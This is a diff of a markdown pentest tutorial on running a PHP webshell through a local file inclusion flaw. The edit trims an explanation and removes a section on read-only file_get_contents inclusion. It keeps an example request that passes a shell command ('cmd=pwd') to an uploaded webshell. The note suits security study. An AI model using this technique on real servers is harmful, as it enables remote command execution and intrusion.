@@ -26,10 +26,9 @@ In both of these situations, the php webshell will not run.
 
 # Using LFI to run the webshell
 
-If an LFI vulnerability is found, it could be used to run the php webshell. However, note that depending on the php function that caused the LFI, this attack might be limited.
+If an LFI vulnerability is found, it could be used to run the php webshell by using "include()" or "require()"
 
-
-**LFI allowing execution (using "include()" or "require()"):**
+Example:
 ```
 <?php
 if (isset($_GET['file'])) {
@@ -50,25 +49,3 @@ http://192.168.7.10/lfi.php?file=uploads/test.php&cmd=pwd
 ```
 
 
-
-
-
-
-**Read Only LFI (using "file_get_contents"):**
-```
-<?php
-if (isset($_GET['file'])) {
-    $file = $_GET['file'];
-    if (file_exists($file)) {
-        $contents = file_get_contents($file);
-        echo nl2br(htmlentities($contents));
-    } else {
-        echo "File does not exist.";
-    }
-} else {
-    echo "No file specified.";
-}
-?>
-```
-
-file_get_contents Only reads files so it is not possible to use it in this case.
